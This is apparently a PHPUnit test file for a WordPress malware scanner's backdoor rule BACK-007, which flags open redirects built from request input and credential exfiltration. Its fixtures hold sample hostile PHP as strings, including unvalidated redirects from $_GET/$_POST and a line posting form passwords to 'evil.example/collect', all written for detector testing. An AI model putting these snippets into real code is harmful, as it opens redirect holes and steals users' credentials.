<?php

declare(strict_types=1);

namespace Wpma\Tests\Detectors;

use PHPUnit\Framework\TestCase;
use Wpma\Detectors\BackdoorDetector;
use Wpma\Models\AnalysisObject;
use Wpma\Models\FileFeatures;
use Wpma\Models\FileMeta;
use Wpma\Models\FunctionCall;
use Wpma\Models\VariableAssignment;
use Wpma\Models\VariableRef;

final class BackdoorDetectorBack007Test extends TestCase
{
    private BackdoorDetector $detector;

    protected function setUp(): void
    {
        parent::setUp();
        $this->detector = new BackdoorDetector();
    }

    public function testWpRedirectWithDirectGetIsDetected(): void
    {
        $ao = $this->makeAo(
            rawContent: '<?php' . "\n" . 'wp_redirect($_GET[\'x\']);',
            calls: [new FunctionCall('wp_redirect', ['$_GET[\'x\']'], 2, false)],
            variables: [new VariableRef('$_GET', 2, true)],
        );

        $this->assertCount(1, $this->filterBack007($this->detector->detect($ao)));
    }

    public function testWpRedirectWithNullCoalescingDirectGetIsDetected(): void
    {
        $ao = $this->makeAo(
            rawContent: '<?php' . "\n" . 'wp_redirect($_GET[\'x\'] ?? \'\');',
            calls: [new FunctionCall('wp_redirect', ['$_GET[\'x\'] ?? \'\''], 2, false)],
            variables: [new VariableRef('$_GET', 2, true)],
        );

        $this->assertCount(1, $this->filterBack007($this->detector->detect($ao)));
    }

    public function testWpRedirectWithDirectPostIsDetected(): void
    {
        $ao = $this->makeAo(
            rawContent: '<?php' . "\n" . 'wp_redirect($_POST[\'foo\']);',
            calls: [new FunctionCall('wp_redirect', ['$_POST[\'foo\']'], 2, false)],
            variables: [new VariableRef('$_POST', 2, true)],
        );

        $this->assertCount(1, $this->filterBack007($this->detector->detect($ao)));
    }

    public function testWpRedirectWithNullCoalescingDirectPostIsDetected(): void
    {
        $ao = $this->makeAo(
            rawContent: '<?php' . "\n" . 'wp_redirect($_POST[\'x\'] ?? \'/fallback\');',
            calls: [new FunctionCall('wp_redirect', ['$_POST[\'x\'] ?? \'/fallback\''], 2, false)],
            variables: [new VariableRef('$_POST', 2, true)],
        );

        $this->assertCount(1, $this->filterBack007($this->detector->detect($ao)));
    }

    public function testHeaderRedirectWithDirectRequestIsDetected(): void
    {
        $ao = $this->makeAo(
            rawContent: '<?php' . "\n" . 'header(\'Location: \' . $_REQUEST[\'abc\']);',
            calls: [new FunctionCall('header', ['\'Location: \' . $_REQUEST[\'abc\']'], 2, false)],
            variables: [new VariableRef('$_REQUEST', 2, true)],
        );

        $this->assertCount(1, $this->filterBack007($this->detector->detect($ao)));
    }

    public function testHeaderRedirectWithParenthesizedNullCoalescingRequestIsDetected(): void
    {
        $ao = $this->makeAo(
            rawContent: '<?php' . "\n" . 'header(\'Location: \' . ($_REQUEST[\'x\'] ?? \'\'));',
            calls: [new FunctionCall('header', ['\'Location: \' . ($_REQUEST[\'x\'] ?? \'\')'], 2, false)],
            variables: [new VariableRef('$_REQUEST', 2, true)],
        );

        $this->assertCount(1, $this->filterBack007($this->detector->detect($ao)));
    }

    public function testWpRedirectWithPostDerivedTargetIsDetected(): void
    {
        $ao = $this->makeAo(
            rawContent: '<?php' . "\n" . '$target = $_POST[\'whatever\'];' . "\n" . 'wp_redirect($target);',
            calls: [new FunctionCall('wp_redirect', ['$target'], 3, false)],
            assignments: [new VariableAssignment('$target', 2, '$_POST[\'whatever\']', [], true)],
            variables: [new VariableRef('$_POST', 2, true)],
        );

        $this->assertCount(1, $this->filterBack007($this->detector->detect($ao)));
    }

    public function testWpRedirectWithNullCoalescingPostDerivedTargetIsDetected(): void
    {
        $ao = $this->makeAo(
            rawContent: '<?php' . "\n" . '$target = $_POST[\'x\'] ?? \'\';' . "\n" . 'wp_redirect($target);',
            calls: [new FunctionCall('wp_redirect', ['$target'], 3, false)],
            assignments: [new VariableAssignment('$target', 2, '$_POST[\'x\'] ?? \'\'', [], true)],
            variables: [new VariableRef('$_POST', 2, true)],
        );

        $this->assertCount(1, $this->filterBack007($this->detector->detect($ao)));
    }

    public function testWpRedirectWithTransitiveRequestTargetIsDetected(): void
    {
        $ao = $this->makeAo(
            rawContent: '<?php' . "\n" . '$a = $_GET[\'x\'];' . "\n" . '$b = $a;' . "\n" . 'wp_redirect($b);',
            calls: [new FunctionCall('wp_redirect', ['$b'], 4, false)],
            assignments: [
                new VariableAssignment('$a', 2, '$_GET[\'x\']', [], true),
                new VariableAssignment('$b', 3, '$a', [], false),
            ],
            variables: [new VariableRef('$_GET', 2, true)],
        );

        $this->assertCount(1, $this->filterBack007($this->detector->detect($ao)));
    }

    public function testWpRedirectWithTransitiveNullCoalescingRequestTargetIsDetected(): void
    {
        $ao = $this->makeAo(
            rawContent: '<?php' . "\n" . '$a = $_GET[\'x\'] ?? \'\';' . "\n" . '$b = $a;' . "\n" . 'wp_redirect($b);',
            calls: [new FunctionCall('wp_redirect', ['$b'], 4, false)],
            assignments: [
                new VariableAssignment('$a', 2, '$_GET[\'x\'] ?? \'\'', [], true),
                new VariableAssignment('$b', 3, '$a', [], false),
            ],
            variables: [new VariableRef('$_GET', 2, true)],
        );

        $this->assertCount(1, $this->filterBack007($this->detector->detect($ao)));
    }

    public function testNestedGetInsideApplicationUrlIsNotDetectedSolelyFromRequestTaint(): void
    {
        $ao = $this->makeAo(
            rawContent: '<?php' . "\n" . 'wp_redirect(application_url(\'/page?id=\' . ($_GET[\'id\'] ?? \'\')));',
            calls: [new FunctionCall('wp_redirect', ['application_url(\'/page?id=\' . ($_GET[\'id\'] ?? \'\'))'], 2, false)],
            variables: [new VariableRef('$_GET', 2, true)],
        );

        $this->assertCount(0, $this->filterBack007($this->detector->detect($ao)));
    }

    public function testNestedServerValueInsideAdminUrlIsNotDetectedSolelyFromRequestTaint(): void
    {
        $ao = $this->makeAo(
            rawContent: '<?php' . "\n" . 'wp_redirect(admin_url(\'page.php?state=\' . ($_POST[\'state\'] ?? \'\')));',
            calls: [new FunctionCall('wp_redirect', ['admin_url(\'page.php?state=\' . ($_POST[\'state\'] ?? \'\'))'], 2, false)],
            variables: [new VariableRef('$_SERVER', 2, true)],
        );

        $this->assertCount(0, $this->filterBack007($this->detector->detect($ao)));
    }

    public function testQueryBuilderAssignmentWithPostTaintIsNotDetectedSolelyFromUsesUserInput(): void
    {
        $ao = $this->makeAo(
            rawContent: '<?php' . "\n" . '$url = add_query_arg(\'mode\', $_POST[\'mode\'] ?? \'\', $base);' . "\n" . 'wp_redirect($url);',
            calls: [new FunctionCall('wp_redirect', ['$url'], 3, false)],
            assignments: [new VariableAssignment('$url', 2, 'add_query_arg(\'mode\', $_POST[\'mode\'] ?? \'\', $base)', ['add_query_arg'], true)],
            variables: [new VariableRef('$_POST', 2, true)],
        );

        $this->assertCount(0, $this->filterBack007($this->detector->detect($ao)));
    }

    public function testDirectPostTargetThroughWpSafeRedirectIsNotDetectedFromProvenanceAlone(): void
    {
        $ao = $this->makeAo(
            rawContent: '<?php' . "\n" . 'wp_safe_redirect($_POST[\'_wp_http_referer\']);',
            calls: [new FunctionCall('wp_safe_redirect', ['$_POST[\'_wp_http_referer\']'], 2, false)],
            variables: [new VariableRef('$_POST', 2, true)],
        );

        $this->assertCount(0, $this->filterBack007($this->detector->detect($ao)));
    }

    public function testDirectGetTargetThroughWpSafeRedirectIsNotDetectedFromProvenanceAlone(): void
    {
        $ao = $this->makeAo(
            rawContent: '<?php' . "\n" . 'wp_safe_redirect($_GET[\'x\']);',
            calls: [new FunctionCall('wp_safe_redirect', ['$_GET[\'x\']'], 2, false)],
            variables: [new VariableRef('$_GET', 2, true)],
        );

        $this->assertCount(0, $this->filterBack007($this->detector->detect($ao)));
    }

    public function testDirectServerRefererTargetThroughWpRedirectIsNotDetectedFromMetadataAlone(): void
    {
        $ao = $this->makeAo(
            rawContent: '<?php' . "\n" . 'wp_redirect($_SERVER[\'HTTP_REFERER\']);',
            calls: [new FunctionCall('wp_redirect', ['$_SERVER[\'HTTP_REFERER\']'], 2, false)],
            variables: [new VariableRef('$_SERVER', 2, true)],
        );

        $this->assertCount(0, $this->filterBack007($this->detector->detect($ao)));
    }

    public function testHeaderRedirectWithServerRequestUriIsNotDetectedFromMetadataAlone(): void
    {
        $ao = $this->makeAo(
            rawContent: '<?php' . "\n" . 'header(\'Location: \' . $_SERVER[\'REQUEST_URI\']);',
            calls: [new FunctionCall('header', ['\'Location: \' . $_SERVER[\'REQUEST_URI\']'], 2, false)],
            variables: [new VariableRef('$_SERVER', 2, true)],
        );

        $this->assertCount(0, $this->filterBack007($this->detector->detect($ao)));
    }

    public function testLocalConstructedRedirectIsNotDetectedWithoutSuspiciousProvenance(): void
    {
        $ao = $this->makeAo(
            rawContent: "<?php\n\$path = build_local_url() . '/setup';\nheader('Location: ' . \$path);",
            calls: [new FunctionCall('header', ["'Location: ' . \$path"], 3, false)],
            assignments: [new VariableAssignment('$path', 2, "build_local_url() . '/setup'", ['build_local_url'], false)],
        );

        $this->assertCount(0, $this->filterBack007($this->detector->detect($ao)));
    }

    public function testOrdinaryRedirectWithUnrelatedUrlsElsewhereIsNotDetected(): void
    {
        $ao = $this->makeAo(
            rawContent: "<?php\n\$x = 'http://evil.example/phish';\nheader('Location: /login');",
            calls: [new FunctionCall('header', ["'Location: /login'"], 3, false)],
            features: new FileFeatures(obfuscationScore: 0.0, encodedBlobs: ['http://evil.example/phish']),
        );

        $this->assertCount(0, $this->filterBack007($this->detector->detect($ao)));
    }

    public function testOrdinaryRedirectWithUnrelatedDynamicDispatchElsewhereIsNotDetected(): void
    {
        $ao = $this->makeAo(
            rawContent: "<?php\ncall_user_func(\$cb, \$data);\nheader('Location: /login');",
            calls: [
                new FunctionCall('call_user_func', ['$cb', '$data'], 2, true),
                new FunctionCall('header', ["'Location: /login'"], 3, false),
            ],
        );

        $this->assertCount(0, $this->filterBack007($this->detector->detect($ao)));
    }

    public function testOrdinaryRedirectWithUnrelatedCredentialCodeElsewhereIsNotDetected(): void
    {
        $ao = $this->makeAo(
            rawContent: "<?php\n\$_POST['password'];\nheader('Location: /login');",
            calls: [new FunctionCall('header', ["'Location: /login'"], 3, false)],
            variables: [new VariableRef('$_POST', 2, true)],
        );

        $this->assertCount(0, $this->filterBack007($this->detector->detect($ao)));
    }

    public function testOrdinaryRedirectWithUnrelatedEncodedContentElsewhereIsNotDetected(): void
    {
        $ao = $this->makeAo(
            rawContent: '<?php' . "\n" . '$payload = base64_decode(\'Zm9v\');' . "\n" . 'header(\'Location: /login\');',
            calls: [new FunctionCall('header', ["'Location: /login'"], 3, false)],
            features: new FileFeatures(obfuscationScore: 0.9, encodedBlobs: ['Zm9vZm9vZm9vZm9v']),
        );

        $this->assertCount(0, $this->filterBack007($this->detector->detect($ao)));
    }

    public function testCredentialExfiltrationWithSpecificOutboundRemoteDestinationIsDetected(): void
    {
        $ao = $this->makeAo(
            rawContent: <<<'PHP'
<?php
$creds = [
    'email' => $_POST['email'],
    'password' => $_POST['password'],
];
wp_remote_post('https://evil.example/collect', ['body' => $creds]);
PHP,
            calls: [new FunctionCall('wp_remote_post', ["'https://evil.example/collect'", "['body' => \$creds]"], 6, false)],
            assignments: [new VariableAssignment('$creds', 2, "['email' => 'email', 'password' => 'password']", [], true)],
            variables: [
                new VariableRef('$_POST', 3, true),
                new VariableRef('$_POST', 4, true),
            ],
        );

        $this->assertCount(1, $this->filterBack007($this->detector->detect($ao)));
    }

    public function testCredentialKeywordsElsewhereDoNotCorrelateWithUnrelatedOutboundRequest(): void
    {
        $ao = $this->makeAo(
            rawContent: '<?php' . "\n" . '$_POST[\'password\'];' . "\n" . "wp_remote_post('https://api.example/resource', ['body' => 'ok']);",
            calls: [new FunctionCall('wp_remote_post', ["'https://api.example/resource'", "['body' => 'ok']"], 3, false)],
            variables: [new VariableRef('$_POST', 2, true)],
        );

        $this->assertCount(0, $this->filterBack007($this->detector->detect($ao)));
    }

    /**
     * @param FunctionCall[] $calls
     * @param VariableAssignment[] $assignments
     * @param VariableRef[] $variables
     */
    private function makeAo(
        string $rawContent,
        array $calls,
        array $assignments = [],
        array $variables = [],
        ?FileFeatures $features = null,
    ): AnalysisObject {
        return new AnalysisObject(
            meta: new FileMeta(
                filePath: '/test/file.php',
                relativePath: 'file.php',
                fileSize: 100,
                extension: '.php',
                encoding: 'UTF-8',
                lineCount: 20,
                scanTimeMs: 0.0,
            ),
            rawContent: $rawContent,
            tokens: [],
            functionCalls: $calls,
            strings: [],
            variables: $variables,
            imports: [],
            assignments: $assignments,
            iocs: [],
            features: $features ?? new FileFeatures(),
            parseErrors: [],
        );
    }

    private function filterBack007(array $findings): array
    {
        return array_values(array_filter($findings, static fn ($finding): bool => $finding->ruleId === 'BACK-007'));
    }
}
